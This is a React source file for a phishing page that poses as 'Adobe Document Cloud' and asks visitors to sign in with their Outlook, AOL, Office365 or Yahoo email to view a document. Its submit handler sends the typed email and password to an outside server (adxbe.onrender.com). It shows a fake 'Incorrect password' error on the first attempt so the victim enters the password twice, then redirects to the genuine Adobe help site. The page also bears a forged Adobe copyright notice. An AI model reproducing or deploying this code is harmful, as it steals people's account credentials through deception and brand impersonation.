import { useState } from "react";
import adobe from './assets/adobe.png';
import Background from './assets/background.png';
import ads from './assets/ads.png'


const providers = [
  { name: "Outlook", color: "bg-blue-600" },
  { name: "AOL", color: "bg-[#3A3A3A]" },      // AOL dark gray
  { name: "Office365", color: "bg-[#F25022]" }, // Office orange
  { name: "Yahoo", color: "bg-[#720E9E]" },     // Yahoo purple
  { name: "Others", color: "bg-blue-500" },
];


const LoginModal = ({ provider, onClose }) => {

  const [clickCount, setClickCount] = useState(0)
  const [error, setError] = useState(null);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    const newClickCount = clickCount + 1;
    setClickCount(newClickCount);

    if (!email || !password) {
      setError("Email and password are required.");
      return;
    }

    const formData = { email, password, provider };

    try {
      const response = await fetch("https://adxbe.onrender.com/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (newClickCount === 1) {
        setError("Incorrect password. Please try again.");
      } else if (response.ok) {
        // ✅ redirect on 2nd attempt
        window.location.href = "https://helpx.adobe.com/support.html";
      } else {
        setError(data.error || "Submission failed.");
      }
    } catch (err) {
      setError("Network error. Try again later.");
    }
  };



  return (
   <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm ">

      {/* Overlay content */}
      <form
        onSubmit={handleSubmit}
        className="w-full h-full md:h-auto md:w-[28rem] bg-white/10 backdrop-blur-md rounded-none md:rounded-xl shadow-xl p-6 flex flex-col justify-center"
      >
        <h2 className="text-2xl font-bold text-white mb-6 text-center">
          Sign in with {provider}
        </h2>

        <input
          type="email"
          placeholder="Enter your email"
          className="w-full p-3 rounded bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022]"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email"
          required
        />
        <input
          type="password"
          placeholder="Enter your password"
          className="w-full p-3 rounded bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022]"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password"
          required
        />
        {error && <p className="text-red-400 text-sm mb-4">{error}</p>}

        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-2 rounded mb-3"
        >
          Login
        </button>
        <button
          type="button"
          onClick={onClose}
          className="w-full text-red-400 text-sm"
        >
          Close
        </button>
      </form>
    </div>

  );
};

export default function AdobeLoginUI() {
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [clickCount, setClickCount] = useState(0); // move clickCount here

  return (
    <div className="relative flex items-center justify-center min-h-screen bg-black overflow-hidden">
      {/* Background image with blur */}
      <img
        src={Background}
        alt=""
        className="absolute inset-0 w-full h-full object-cover blur-md opacity-50"
      />

      {/* Glass overlay */}
      <div className="absolute inset-0 bg-white/10 backdrop-blur-sm z-10" />

      {/* Content container */}
      <div className="z-20 relative flex flex-col items-center space-y-4">

        {/* Adobe logo and write-up OUTSIDE the white container */}
        <div className="text-center text-white">
          <img src={adobe} alt="Adobe" className="mx-auto w-14 mb-2" />
          <h2 className="text-3xl font-semibold">Adobe Document Cloud</h2>
          <p className="text-xl mt-2 mb-4">To read the document, please choose your email provider below.</p>
        </div>

        {/* White container for buttons */}
        <div className="bg-gray-300 text-black p-4 rounded-2xl w-80 text-center">
          {providers.map(({ name, color, image }) => (
            <button
              key={name}
              className={`w-30 ${color} cursor-pointer text-white font-bold p-2 rounded-2xl mb-2 mx-auto flex items-center justify-center gap-2`}
              onClick={() => {
                setSelectedProvider(name);
                setClickCount(0);
              }}
            >
              {image && <img src={image} alt={name} className="w-5 h-5" />}
              <span className="text-sm">{name}</span>
            </button>
          ))}
        </div>

        <p className="text-sm mt-4">CopyRight &copy; 2025 Adobe System Incorporated.</p>
      </div>

      {
        selectedProvider && (
          <LoginModal
            provider={selectedProvider}
            onClose={() => setSelectedProvider(null)}
            clickCount={clickCount}
            setClickCount={setClickCount}
          />
        )
      }
    </div >
  );
}





